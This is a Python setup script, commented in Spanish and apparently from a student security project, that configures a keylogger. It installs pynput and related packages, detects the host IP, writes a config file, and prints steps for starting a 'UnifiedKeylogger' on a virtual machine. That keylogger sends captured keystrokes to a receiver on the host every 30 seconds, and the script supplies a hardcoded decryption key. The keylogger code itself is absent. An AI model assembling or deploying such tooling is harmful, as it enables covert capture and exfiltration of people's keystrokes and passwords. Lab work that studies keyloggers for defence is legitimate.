#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import subprocess
import sys
import os
import socket

def install_dependencies():
    # instalo las dependencias necesarias
    print("📦 instalando dependencias...")
    
    try:
        # instalo desde requirements.txt
        result = subprocess.run([
            sys.executable, "-m", "pip", "install", "-r", "requirements.txt"
        ], check=True, capture_output=True, text=True)
        
        print("✅ dependencias instaladas correctamente")
        return True
        
    except subprocess.CalledProcessError as e:
        print(f"❌ error instalando dependencias: {e}")
        print("intenta instalar manualmente:")
        print("pip install requests pynput flask")
        return False

def get_local_ip():
    # obtengo la ip local de esta máquina
    try:
        # me conecto a google dns para obtener mi ip local
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
            s.connect(("8.8.8.8", 80))
            local_ip = s.getsockname()[0]
        return local_ip
    except:
        return "192.168.1.100"  # ip por defecto

def create_vm_config():
    # creo un archivo de configuración para la vm
    local_ip = get_local_ip()
    
    config_content = f"""# configuración para la máquina virtual
# coloca este archivo en la vm y úsalo para configurar el keylogger

# ip de tu máquina host (donde corre el receptor)
TARGET_IP = "{local_ip}"

# puerto donde escucha el receptor
TARGET_PORT = 8080

# intervalo de envío (segundos)
SEND_INTERVAL = 30

# ejemplo de uso en la vm:
# keylogger = UnifiedKeylogger(
#     reconstruction_interval=5,
#     enable_encryption=True,
#     send_interval={30},
#     target_ip="{local_ip}",
#     target_port=8080
# )
"""
    
    with open("vm_config.py", "w", encoding="utf-8") as f:
        f.write(config_content)
    
    print(f"📝 configuración creada: vm_config.py")
    print(f"🔗 ip detectada: {local_ip}")

def show_instructions():
    # muestro las instrucciones de uso
    local_ip = get_local_ip()
    
    print("\n" + "="*60)
    print("🎯 CONFIGURACIÓN COMPLETADA")
    print("="*60)
    print()
    print("📋 PASOS A SEGUIR:")
    print()
    print("1️⃣  EN TU MÁQUINA HOST (esta máquina):")
    print("   python data_receiver.py")
    print("   (esto iniciará el servidor receptor)")
    print()
    print("2️⃣  EN LA MÁQUINA VIRTUAL:")
    print("   - copia todos los archivos .py a la vm")
    print("   - instala dependencias: pip install requests pynput")
    print("   - ejecuta:")
    print("     from unified_keylogger import UnifiedKeylogger")
    print(f"     keylogger = UnifiedKeylogger(")
    print(f"         reconstruction_interval=5,")
    print(f"         enable_encryption=True,")
    print(f"         send_interval=30,")
    print(f"         target_ip='{local_ip}',")
    print(f"         target_port=8080")
    print(f"     )")
    print(f"     keylogger.start()")
    print()
    print("3️⃣  PARA DESCIFRAR:")
    print("   python decryptor.py received_data/encrypted_data_X.enc ClaveSecreta2025-CyberSeguridad")
    print()
    print("📡 PUERTOS:")
    print(f"   - receptor: puerto 8080 en {local_ip}")
    print("   - asegúrate que el firewall permita conexiones entrantes")
    print()
    print("🔐 CLAVE:")
    print("   ClaveSecreta2025-CyberSeguridad")
    print()

def main():
    print("🔧 CONFIGURADOR AUTOMÁTICO")
    print("proyecto de seguridad informática")
    print("="*40)
    print()
    
    # verifico que estoy en el directorio correcto
    if not os.path.exists("decryptor.py"):
        print("❌ ejecuta este script desde el directorio del proyecto")
        return
    
    # instalo dependencias
    if not install_dependencies():
        print("⚠️  continúa con instalación manual")
    
    # creo configuración para vm
    create_vm_config()
    
    # muestro instrucciones
    show_instructions()

if __name__ == "__main__":
    main()
